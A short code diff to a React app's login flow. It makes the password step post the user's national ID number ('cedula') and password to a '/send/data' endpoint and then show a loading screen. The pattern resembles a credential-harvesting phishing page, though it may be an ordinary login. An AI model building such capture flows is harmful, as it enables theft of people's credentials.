@@ -14,13 +14,15 @@ function App() {
 
   const onContinue = () => {
     try {
-      api.post({
-        cedula,
-        password,
-      });
+      api.post("/send/data", { cedula, password });
     } catch (error) {
       console.error(error);
     }
+  };
+
+  const handleWait = () => {
+    onContinue();
+    setStep("loading");
   };
 
   return (
@@ -67,7 +69,7 @@ function App() {
           ) : step === "password" ? (
             <PasswordForm
               onClose={() => setStep("id")}
-              onContinue={() => setStep("loading")}
+              onContinue={() => handleWait()}
               password={password}
               setPassword={setPassword}
             />
